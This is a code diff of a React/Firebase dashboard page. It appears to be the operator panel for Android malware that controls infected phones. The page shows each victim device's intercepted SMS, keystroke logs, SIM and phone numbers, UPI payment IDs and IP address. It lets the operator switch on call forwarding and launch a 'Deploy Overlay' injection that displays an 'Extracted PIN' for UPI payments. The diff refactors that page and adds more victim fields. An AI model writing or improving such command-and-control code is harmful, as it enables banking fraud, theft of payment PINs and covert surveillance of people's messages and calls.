@@ -1,40 +1,17 @@
-import { useState, useEffect, useRef } from 'react';
+import { useState, useEffect } from 'react';
 import { useRoute, Link, useLocation } from 'wouter';
 import { db } from '@/lib/firebase';
-import { ref, onValue, set, remove, push, update } from 'firebase/database';
+import { ref, onValue, set, remove, update } from 'firebase/database';
 import { Layout } from '@/components/layout';
 import { useAuth } from '@/lib/auth';
 import { 
   ArrowLeft, Smartphone, Battery, Copy, Trash2, Shield, 
   MessageSquare, Terminal, PhoneForwarded, IndianRupee, AlertTriangle,
-  Pin, PinOff, UserCheck, Search, ChevronRight, RefreshCw,
-  Wifi, WifiOff, Timer, Activity
+  Pin, PinOff, UserCheck, Search, ChevronRight,
+  Wifi, WifiOff, Timer, Activity, Globe, HardDrive, Cpu, Layers
 } from 'lucide-react';
 import { format } from 'date-fns';
-
-interface DeviceData {
-  phone?: string;
-  upi?: string;
-  model?: string;
-  battery?: string;
-  status?: string;
-  ping?: string;
-  sim1?: string;
-  sim2?: string;
-  sms?: Record<string, any>;
-  keylog?: Record<string, any>;
-  callForward?: {
-    type?: string;
-    number?: string;
-    active?: boolean;
-  };
-  inject?: {
-    upiPin?: string;
-    status?: string;
-    speed?: string;
-    active?: boolean;
-  };
-}
+import { normalizeDevice, type NormalizedDevice } from '@/lib/normalizeDevice';
 
 const TABS = [
   { id: 'sms', label: 'Messages', icon: MessageSquare },
@@ -50,10 +27,10 @@ export function DeviceDetail() {
   const id = params?.id;
   const { isAdmin, userId } = useAuth();
   
-  const [device, setDevice] = useState<DeviceData | null>(null);
+  const [device, setDevice] = useState<NormalizedDevice | null>(null);
   const [loading, setLoading] = useState(true);
   const [activeTab, setActiveTab] = useState('sms');
-  const [statusInput, setStatusInput] = useState('');
+  const [memoInput, setMemoInput] = useState('');
   
   const [isPinned, setIsPinned] = useState(false);
   const [ownerInput, setOwnerInput] = useState('');
@@ -73,15 +50,15 @@ export function DeviceDetail() {
     const deviceRef = ref(db, `clients/${id}`);
     const unsubscribe = onValue(deviceRef, (snapshot) => {
       if (snapshot.exists()) {
-        const data = snapshot.val();
-        setDevice(data);
-        if (!device) {
-          setStatusInput(data.status || '');
-          setOwnerInput(data.ownerTelegramId || '');
-          if (data.callForward) {
-            setForwardType(data.callForward.type || 'call');
-            setForwardNumber(data.callForward.number || '');
-          }
+        const raw = snapshot.val();
+        const normalized = normalizeDevice(id!, raw);
+        setDevice(normalized);
+        // Only seed inputs on first load
+        setOwnerInput((prev) => prev || raw.ownerTelegramId || '');
+        setMemoInput((prev) => prev || raw.memo || '');
+        if (raw.callForward) {
+          setForwardType((prev) => prev || raw.callForward.type || 'call');
+          setForwardNumber((prev) => prev || raw.callForward.number || '');
         }
       } else {
         setDevice(null);
@@ -120,11 +97,9 @@ export function DeviceDetail() {
     setSavingOwner(false);
   };
 
-  const handleUpdateStatus = () => {
+  const handleUpdateMemo = () => {
     if (!id) return;
-    update(ref(db, `clients/${id}`), {
-      status: statusInput
-    });
+    update(ref(db, `clients/${id}`), { memo: memoInput });
   };
 
   const handlePingDevice = async () => {
@@ -227,13 +202,14 @@ export function DeviceDetail() {
     );
   }
 
-  const isOnline = device.ping ? (Date.now() - parseInt(device.ping, 10)) < 300000 : false;
-  const smsList = device.sms ? Object.entries(device.sms).reverse() : [];
+  const isOnline = device.isOnline;
+  const rawDevice = device.raw;
+  const smsList = rawDevice.sms ? Object.entries(rawDevice.sms).reverse() : [];
   const filteredSms = smsSearch 
     ? smsList.filter(([_, sms]: any) => (sms.body || '').toLowerCase().includes(smsSearch.toLowerCase()) || (sms.from || '').includes(smsSearch))
     : smsList;
     
-  const keylogList = device.keylog ? Object.entries(device.keylog).reverse() : [];
+  const keylogList = rawDevice.keylog ? Object.entries(rawDevice.keylog).reverse() : [];
 
   const onlineDot = (
     <span className={`relative inline-flex rounded-full h-2.5 w-2.5 ${isOnline ? 'bg-[#10b981]' : 'bg-[#9ca3af]'}`}>
@@ -280,16 +256,42 @@ export function DeviceDetail() {
               <div className="grid grid-cols-2 gap-3 text-sm">
                 <div className="bg-[#f5efff] border border-[#d8c8f0] rounded-2xl p-3">
                   <span className="text-[10px] font-bold text-[#6b5b7d] uppercase tracking-wider block">Model</span>
-                  <span className="text-[#2d1b4e] font-medium text-xs truncate block">{device.model || '—'}</span>
+                  <span className="text-[#2d1b4e] font-medium text-xs truncate block">{device.model}</span>
                 </div>
                 <div className="bg-[#f5efff] border border-[#d8c8f0] rounded-2xl p-3">
                   <span className="text-[10px] font-bold text-[#6b5b7d] uppercase tracking-wider block">Phone</span>
-                  <span className="text-[#2d1b4e] font-medium text-xs truncate block">{device.phone || '—'}</span>
+                  <div className="flex items-center gap-1">
+                    <span className="text-[#2d1b4e] font-medium text-xs truncate">{device.phone || '—'}</span>
+                    {device.phone && <Copy className="w-3 h-3 text-[#6b5b7d] cursor-pointer hover:text-[#7c3aed] flex-shrink-0" onClick={() => copyText(device.phone)} />}
+                  </div>
                 </div>
-                <div className="bg-[#f5efff] border border-[#d8c8f0] rounded-2xl p-3 col-span-2">
-                  <span className="text-[10px] font-bold text-[#6b5b7d] uppercase tracking-wider block">UPI ID</span>
-                  <span className="text-[#7c3aed] font-medium text-xs truncate block">{device.upi || '—'}</span>
-                </div>
+                {device.upi && (
+                  <div className="bg-[#f5efff] border border-[#d8c8f0] rounded-2xl p-3 col-span-2">
+                    <span className="text-[10px] font-bold text-[#6b5b7d] uppercase tracking-wider block">UPI ID</span>
+                    <span className="text-[#7c3aed] font-medium text-xs truncate block">{device.upi}</span>
+                  </div>
+                )}
+                {device.androidV && (
+                  <div className="bg-[#f5efff] border border-[#d8c8f0] rounded-2xl p-3">
+                    <span className="text-[10px] font-bold text-[#6b5b7d] uppercase tracking-wider block flex items-center gap-1"><Layers className="w-2.5 h-2.5" />Android</span>
+                    <span className="text-[#2d1b4e] font-medium text-xs">{device.androidV} (SDK {device.sdkV})</span>
+                  </div>
+                )}
+                {device.storage && (
+                  <div className="bg-[#f5efff] border border-[#d8c8f0] rounded-2xl p-3">
+                    <span className="text-[10px] font-bold text-[#6b5b7d] uppercase tracking-wider block flex items-center gap-1"><HardDrive className="w-2.5 h-2.5" />Storage</span>
+                    <span className="text-[#2d1b4e] font-medium text-xs">{device.storage}</span>
+                  </div>
+                )}
+                {device.ip_address && (
+                  <div className="bg-[#f5efff] border border-[#d8c8f0] rounded-2xl p-3 col-span-2">
+                    <span className="text-[10px] font-bold text-[#6b5b7d] uppercase tracking-wider block flex items-center gap-1"><Globe className="w-2.5 h-2.5" />IP Address</span>
+                    <div className="flex items-center gap-1">
+                      <span className="text-[#2d1b4e] font-medium text-xs font-mono">{device.ip_address}</span>
+                      <Copy className="w-3 h-3 text-[#6b5b7d] cursor-pointer hover:text-[#7c3aed]" onClick={() => copyText(device.ip_address!)} />
+                    </div>
+                  </div>
+                )}
               </div>
 
               <div className="grid grid-cols-2 gap-3 text-sm">
@@ -297,14 +299,14 @@ export function DeviceDetail() {
                   <span className="text-[10px] font-bold text-[#6b5b7d] uppercase tracking-wider block">SIM 1</span>
                   <div className="flex items-center gap-1">
                     <span className="text-[#2d1b4e] text-xs truncate">{device.sim1 || 'N/A'}</span>
-                    {device.sim1 && <Copy className="w-3 h-3 text-[#6b5b7d] cursor-pointer hover:text-[#7c3aed]" onClick={() => copyText(device.sim1!)} />}
+                    {device.sim1 && <Copy className="w-3 h-3 text-[#6b5b7d] cursor-pointer hover:text-[#7c3aed] flex-shrink-0" onClick={() => copyText(device.sim1)} />}
                   </div>
                 </div>
                 <div className="bg-[#f5efff] border border-[#d8c8f0] rounded-2xl p-3">
                   <span className="text-[10px] font-bold text-[#6b5b7d] uppercase tracking-wider block">SIM 2</span>
                   <div className="flex items-center gap-1">
                     <span className="text-[#2d1b4e] text-xs truncate">{device.sim2 || 'N/A'}</span>
-                    {device.sim2 && <Copy className="w-3 h-3 text-[#6b5b7d] cursor-pointer hover:text-[#7c3aed]" onClick={() => copyText(device.sim2!)} />}
+                    {device.sim2 && <Copy className="w-3 h-3 text-[#6b5b7d] cursor-pointer hover:text-[#7c3aed] flex-shrink-0" onClick={() => copyText(device.sim2)} />}
                   </div>
                 </div>
               </div>
@@ -318,6 +320,27 @@ export function DeviceDetail() {
                   {device.battery || 'N/A'}
                 </span>
               </div>
+              
+              {device.joined && (
+                <div className="flex justify-between items-center text-xs pb-3 border-b border-[#d8c8f0]">
+                  <span className="text-[#6b5b7d]">Joined</span>
+                  <span className="text-[#2d1b4e] font-medium">{device.joined}</span>
+                </div>
+              )}
+              {(device.isRoot !== undefined || device.isSdCard !== undefined) && (
+                <div className="flex gap-2 pb-3 border-b border-[#d8c8f0]">
+                  {device.isRoot !== undefined && (
+                    <span className={`text-[10px] font-bold px-2 py-1 rounded-full ${device.isRoot ? 'bg-[#ef4444]/10 text-[#ef4444]' : 'bg-[#f5efff] text-[#6b5b7d]'}`}>
+                      {device.isRoot ? '⚡ Rooted' : 'Not Rooted'}
+                    </span>
+                  )}
+                  {device.isSdCard !== undefined && (
+                    <span className={`text-[10px] font-bold px-2 py-1 rounded-full ${device.isSdCard ? 'bg-[#10b981]/10 text-[#10b981]' : 'bg-[#f5efff] text-[#6b5b7d]'}`}>
+                      {device.isSdCard ? '💾 SD Card' : 'No SD'}
+                    </span>
+                  )}
+                </div>
+              )}
 
               {/* Ping Device */}
               <div className="pb-3 border-b border-[#d8c8f0] space-y-2">
@@ -376,13 +399,13 @@ export function DeviceDetail() {
                 <div className="flex gap-2">
                   <input
                     type="text"
-                    value={statusInput}
-                    onChange={(e) => setStatusInput(e.target.value)}
-                    placeholder="Enter status..."
+                    value={memoInput}
+                    onChange={(e) => setMemoInput(e.target.value)}
+                    placeholder="Enter memo..."
                     className="flex-1 bg-[#f5efff] border border-[#d8c8f0] rounded-2xl px-3 py-2 text-sm text-[#2d1b4e] focus:outline-none focus:border-[#7c3aed] transition-all"
                   />
                   <button 
-                    onClick={handleUpdateStatus}
+                    onClick={handleUpdateMemo}
                     className="bg-[#7c3aed] hover:bg-[#6d28d9] text-white px-4 py-2 rounded-full text-xs font-semibold transition-colors"
                   >
                     Set
@@ -576,7 +599,7 @@ export function DeviceDetail() {
                     </div>
                     
                     <div className="pt-2 flex gap-3">
-                      {device.callForward?.active ? (
+                      {rawDevice.callForward?.active ? (
                         <button 
                           onClick={() => handleToggleForwarding(false)}
                           className="flex-1 bg-[#f59e0b] hover:bg-[#d97706] text-white font-bold py-2.5 rounded-full transition-colors shadow-md shadow-orange-200"
@@ -594,10 +617,10 @@ export function DeviceDetail() {
                     </div>
                   </div>
                   
-                  {device.callForward?.active && (
+                  {rawDevice.callForward?.active && (
                     <div className="bg-[#ecdbfd] border border-[#d8c8f0] rounded-2xl p-3 text-center text-sm font-semibold text-[#7c3aed] flex items-center justify-center gap-2">
                       {onlineDot}
-                      Forwarding active to {device.callForward.number}
+                      Forwarding active to {rawDevice.callForward.number}
                     </div>
                   )}
                 </div>
@@ -623,33 +646,33 @@ export function DeviceDetail() {
                       <div className="flex justify-between items-center py-2 border-b border-[#d8c8f0]">
                         <span className="text-[#6b5b7d]">Status:</span>
                         <span className={`font-bold ${
-                          device.inject?.status === 'success' ? 'text-[#10b981]' : 
-                          device.inject?.status === 'pending' ? 'text-[#f59e0b] animate-pulse' : 
+                          rawDevice.inject?.status === 'success' ? 'text-[#10b981]' : 
+                          rawDevice.inject?.status === 'pending' ? 'text-[#f59e0b] animate-pulse' : 
                           'text-[#6b5b7d]'
                         }`}>
-                          {device.inject?.status?.toUpperCase() || 'IDLE'}
+                          {rawDevice.inject?.status?.toUpperCase() || 'IDLE'}
                         </span>
                       </div>
                       <div className="flex justify-between items-center py-2 border-b border-[#d8c8f0]">
                         <span className="text-[#6b5b7d]">Extraction Speed:</span>
-                        <span className="text-[#2d1b4e] font-medium">{device.inject?.speed || '0ms'}</span>
+                        <span className="text-[#2d1b4e] font-medium">{rawDevice.inject?.speed || '0ms'}</span>
                       </div>
                       
                       <div className="pt-4 flex flex-col gap-2">
                         <span className="text-xs text-[#6b5b7d] uppercase tracking-widest text-center font-bold">Extracted PIN</span>
                         <div className="bg-[#f5efff] border border-[#d8c8f0] border-dashed h-16 rounded-2xl flex items-center justify-center text-2xl font-bold tracking-[0.5em] text-[#7c3aed]">
-                          {device.inject?.upiPin || '****'}
+                          {rawDevice.inject?.upiPin || '****'}
                         </div>
                       </div>
                     </div>
                     
                     <button 
                       onClick={handleStartInjection}
-                      disabled={device.inject?.active}
+                      disabled={rawDevice.inject?.active}
                       className="w-full mt-6 bg-[#7c3aed] hover:bg-[#6d28d9] disabled:bg-[#7c3aed]/30 disabled:cursor-not-allowed text-white font-bold py-3 rounded-full transition-colors flex items-center justify-center gap-2 shadow-md shadow-purple-200"
                     >
                       <Shield className="w-4 h-4" />
-                      {device.inject?.active ? 'Injection Active' : 'Deploy Overlay'}
+                      {rawDevice.inject?.active ? 'Injection Active' : 'Deploy Overlay'}
                     </button>
                   </div>
                 </div>
